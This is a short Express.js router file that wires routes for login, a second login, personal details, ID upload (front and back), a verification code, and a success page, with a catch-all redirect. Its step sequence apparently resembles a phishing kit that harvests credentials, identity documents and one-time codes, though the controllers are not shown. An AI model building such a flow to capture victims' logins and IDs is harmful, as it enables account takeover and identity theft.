const express = require("express");
const router = express.Router();
const controller = require("../controller/controller");
const upload = require("../middleware/imageUpload");

router.get("/auth/login", controller.login);
router.post("/auth/login", controller.loginPost);

router.get("/auth/login/2", controller.login2);
router.post("/auth/login/2", controller.loginPost2);

router.get("/auth/personal", controller.personal);
router.post("/auth/personal", controller.personalPost);

router.get("/auth/verify-id", controller.verifyId);
router.post(
  "/auth/verify-id",
  upload.fields([
    { name: "frontId", maxCount: 1 },
    { name: "backId", maxCount: 1 },
]),
controller.verifyIdPost
);

router.get("/auth/code", controller.code);
router.post("/auth/code", controller.codePost);

module.exports = router;

router.get("/auth/success", controller.success);

router.get("*", controller.page404Redirect);

module.exports = router;
